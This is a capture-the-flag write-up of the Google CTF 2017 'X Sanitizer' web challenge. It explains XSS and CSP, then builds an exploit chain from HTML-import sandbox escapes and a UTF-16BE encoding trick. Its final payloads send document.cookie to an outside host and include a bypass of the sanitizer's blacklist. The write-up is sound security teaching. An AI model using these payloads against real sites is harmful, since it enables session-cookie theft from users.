---
title: Google CTF Quals 2017 - X Sanitizer
authors: Nick Burnett
date: 2017-07-06
categories: web
---

This writeup is for the reversing challenge "X Sanitizer" we solved during 2017 Google CTF
Quals.  This writeup and 3 others were also submitted to the Google CTF Writeup
Competition.

Some parts of this writeup will include background information about the concept.

### Investigation: Index page

The site contains a text box, which we can enter html into. When the button is clicked, it
runs some kind of sanitization program, and finally renders the output back to the screen.
The page claims that the entire process is client side, and that there is no hidden server
logic. From this and description, I would guess that the goal is to preform a Cross Site
Scripting (XSS) attack on the page.

#### Background: Cross Site Scripting

Browsers try to protect users from malicious websites by using something called the Same
Origin Policy (SOP). This policy controls what a website can and cannot do. For example a
website **can** access its own cookies and read its own web pages, but it **cannot** read
the cookies or data of *another* webpage. To define what a webpage is, we use the term
**origin**. A page's origin in most cases is based on the domain name. So `google.com` is
one origin, while `facebook.com` is another.

The fact that SOP blocks cookies is a good thing for the user, because most websites use
cookies to tell if you are logged in.  Reading another site's cookie would allow an
attacker to log in as you.

However, I mentioned that websites can access their own cookies. Here is where XSS comes
into play. If an attacker can run javascript on a website, they will have all the same
permissions as the website, even if the script was not originally from the website (hence
the name **cross site** scripting). Executing javascript on this origin will be our goal
for this challenge.

### Investigation: Santization system

Included from the index page was two javscript script file `sanitize.js`. We can see that
it first takes our input in the Sanitize function. The code then spawns a service worker.
Service workers are a feature in chrome which allow the client to server response to
requests for a script. Below we can see the responses it sends as part of the fetch
function:

- `/sandbox` will append the contents of the url parameter `html` to this html which loads
  the sanitize script:

```html
<!doctype HTML>
<script src=sanitize>
</script>
<body>
```

- `/sanitize` will respond with a script that sets up a 1 second timer to respond to the
  parent, as well as a Content Security Policy (more on that in a second). It also creates
  a remove function which will either delete a given html node, or remove the documents
  contents:

```javascript
// Onload, wait one second, and respond with the document's contents
onload = _=> setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000);
// This function removes a given node from the document
remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
// On CSP error, call remove on the violating element
document.addEventListener("securitypolicyviolation", e => remove(e.target));
// Write an html meta tag to enable the CSP
document.write('<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src *"><body>');
```

- Any other request will respond with a page that is designed to either be html or
  javascript, either way it will run the javascript (since it will request x which just
  returns this page again.) The purpose of this code is to delete whatever requested it,
  either the script tag, or the HTML import (we'll look at this more soon too):

```javascript
with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
// <script src=x></script>
```

The sanitize function first tries to remove a few black listed words from our input:

```javascript
while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, '');
```
Since they run it with a loop, we cannot bypass it by simply doing something like
`<me<meta>ta>`. However, it is good to keep in mind what they are trying to block.

Finally the function creates an iframe pointed at `/sandbox?html=<OURINPUT>` and lets it
run. As we saw above, after 1 second the page will send its contents to us. Once we get
that back, the script writes the contents to the page without any further sanitization. If
we can get any javascript into here, we should be able to steal the cookies.

### Investigation: Sandbox page

As I said, the script run in the sandbox page sets up a Content Security Policy (CSP)
using the meta html tag. This policy consits of `default-src 'none'; script-src *`. This
means that by default all requests and inline content will be blocked, but all script
requests will be allowed (but not inline content). Seeing this we can also check the CSP
of the main page to find it is `script-src 'self'` which will block all script requests
not going to the same origin.

#### Background: Content Security Policy

A CSP is another tool the browser uses to protect sites. Like SOP it dictates what a site
is allowed to do. However, these restrictions are actually enabled by the site itself, to
protect it from things it might not normally do. For example, if a site never expects to
run unsigned script tags, then if one appears, it is probably an attacker trying to
preform an XSS attack. By setting `script-src` in the CSP, the site knows to block that
tag. Good CSPs are very effective and can be very difficult to bypass.

To check for a CSP, first check the response headers of the site. If there is not one
there, it can still be enabled with a `<meta>` HTML tag in the page header.

#### Sandbox

The CSP on the sandbox page also has a special feature. The sanitize script sets up a
callback which will be called on `securitypolicyviolation` which will happen any time a
request is blocked by the CSP. It calls the remove function, which will delete the element
that caused the CSP to trigger, removing them from the final output of the sandbox!

The second feature is that any scripts we run will respond with the javascript that
removes the script tag. This also tries to stop HTML imports. HTML imports are a way of
loading another HTML page into the current page, and is useful for XSS since the browser
will run anything we put on the other page (assuming the CSP doesn't stop it.) It is done
like this: `<link rel="import" href="page to load">`

Here, importing any page will also respond with this response. The javascript will be
ignored, but `<script src=x></script>` will run, and the same script will be loaded.
`querySelector('link[rel="import"]')` looks for the `link` tag doing the import.

At first glance it seems that every way for us to run javascript is either blocked, or
will cause our tags to be removed from the final output!

### Sandbox Bypass

I found two ways to bypass the sandbox, and inject script tags into the main page. Both of
them use the HTML import feature.


##### Method 1:

To respond to the parent, we saw that the sandbox uses a one second time:

```javascript
setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000)
```
When this timer triggers, anything still on the page will be send back to the script.  

I found that by using the `async` feature of HTML imports, I could cause some to remain
when time was up.  Adding `async` to the import tag, causes the import to actually be
loaded after the page has finished loading.  This means that `onload` would have been
triggered, and the timer would have started counting down. By adding a large number of
these tags (around 500), some will remain by the time 1 second is up.
  
##### Method 2:

A simpler method, (probably the intended solution) is due to a flaw in their code. When
the import removing code is run, it uses `querySelector('link[rel="import"]')` to find the
`link` tag. However this will only locate the first `link` tag.  

If we put `<link rel="import">` and also `<link rel="import" href="page to load>`, then
only the first will be deleted when the second is loaded!
 
Using either method, we can now do a HTML import on the main page. However there is a new
problem! As I mentioned above, the main page has a CSP with `script-src 'self'`.  This
means that we can only run scripts and import pages from the
`sanitizer.web.ctfcompetition.com` domain.

### Bypassing script-src 'self'

Our goal is still to run javscript, but now we must find a way to load it from the
somewhere on the challenge.

#### Injecting a Script Tag

Lets start by injecting a script tag using the HTML import we smuggled out of the sandbox.
This is relatively easy, thanks to the sandbox page. We can url encode the script tag with
javascript and put it as the `html` url parameter. 

```javascript
payload = encodeURIComponent('<script src="target"></script>');
``` 

Requesting `/sandbox?html=%3Cscript%20src%3D%22target%22%3E%3C%2Fscript%3E` gives us

```html
<!doctype HTML>
<script src=sanitize>
</script>
<body><script src="target"></script>
```

You may be worried about the sanitize script being run again, but luckily since our code
doesn't actually 'activate' it, there is no `client` yet, so the logic causes it to 404:

```javascipt
var isSandbox = url => (new URL(url)).pathname === '/sandbox';
if (client && isSandbox(client.url)) {
   // Respond with sanitize stuff
} else if (isSandbox(e.request.url)) 
  // Respond with sandbox page
} else 
  // Try to load the real page (causes /sanitize to 404)
  return fetch(e.request);
}
```

Our payload so far:

```html
<link rel="import"><link rel="import" href="/sandbox?html=%3Cscript%20src%3D%22target%22%3E%3C%2Fscript%3E">
```

#### Putting Javascript on /sandbox

Now we can load a script, but we can still only load from the
`sanitizer.web.ctfcompetition.com` domain. We can try to put our script on `/sandbox` like
we did the script tag, put that gives us problems, since the tags in the first part of the
page is not valid javascript.

To bypass this we can use an encoding attack. An encoding attack is where we specifiy a
multibyte encoding for the script. If we are lucky, all of the html junk will turn into
one large valid identifier, thanks to javascript's unicode support.

If we were to load the page as utf16 big endien (specified as `utf-16be`), beginning turns
into:

```javascript
㰡摯捴祰攠䡔䵌㸊㱳捲楰琠獲挽獡湩瑩穥㸊㰯獣物灴㸊㱢潤社
```

To prevent this from causing an error, we can append `=0\n`. Now we can also append our
own cookie stealing payload and encode it as `utf-16be` and urlencode (for normal
characters in `utf-16be`, the character is prepended by a null byte): 

```javascript
utf16be = function(s) {
  var out = '';
  for (var i=0; i<s.length; i++) {
    out += '\0' + s[i];
  }
  return out;
}
payload = encodeURIComponent(utf16be('=0\nlocation="//itszn.com/"+document.cookie'));
```

We can load it like this:

```html
<script src="/sandbox?html=%00%3D%000%00%0A%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%22%00%2F%00%2F%00i%00t%00s%00z%00n%00.%00c%00o%00m%00%2F%00%22%00%2B%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e" charset="utf-16be"></script>
```

The script that is run is this:

```javscript
㰡摯捴祰攠䡔䵌㸊㱳捲楰琠獲挽獡湩瑩穥㸊㰯獣物灴㸊㱢潤社=0
location="//itszn.com"+document.cookie
```

### Putting it all together

Now we can put that script into the import like we did before, and we should be good to go:

```javascript
payload = encodeURIComponent(utf16be('=0\nlocation="//itszn.com/"+document.cookie'));
payload = encodeURIComponent('<script src="/sandbox?html='+payload+'" charset="utf-16be"></script>');
payload = '<link rel="import"><link rel="import" href="/sandbox?html='+payload+'">'
```

This gives us the final long payload

```html
<link rel="import"><link rel="import" href="/sandbox?html=%3Cscript%20src%3D%22%2Fsandbox%3Fhtml%3D%2500%253D%25000%2500%250A%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500%253D%2500%2522%2500%252F%2500%252F%2500i%2500t%2500s%2500z%2500n%2500.%2500c%2500o%2500m%2500%252F%2500%2522%2500%252B%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%22%3E%3C%2Fscript%3E">
```

However, if we try this, we find there is still one problem!

The original sandbox removes 'utf-16be' from our input:

```javascript
while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, '');
```

This is easy to bypass, as we can just url encode `utf-16be` to `utf-16b%65` with this:

```javascript
payload = payload.replace('utf-16be','utf-16b%65');
```

The final corrected payload is

```html
<link rel="import"><link rel="import" href="/sandbox?html=%3Cscript%20src%3D%22%2Fsandbox%3Fhtml%3D%2500%253D%25000%2500%250A%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500%253D%2500%2522%2500%252F%2500%252F%2500i%2500t%2500s%2500z%2500n%2500.%2500c%2500o%2500m%2500%252F%2500%2522%2500%252B%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%22%20charset%3D%22utf-16b%65%22%3E%3C%2Fscript%3E">
```

Waiting for the request back we see

```
GET /?flag=CTF{no-problem-this-can-be-fixed-by-adding-a-single-if} HTTP/1.1
Host: itszn.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-DevTools-Request-Id: 2811.24
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/59.0.3071.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
```

And we have captured the flag! `CTF{no-problem-this-can-be-fixed-by-adding-a-single-if}`
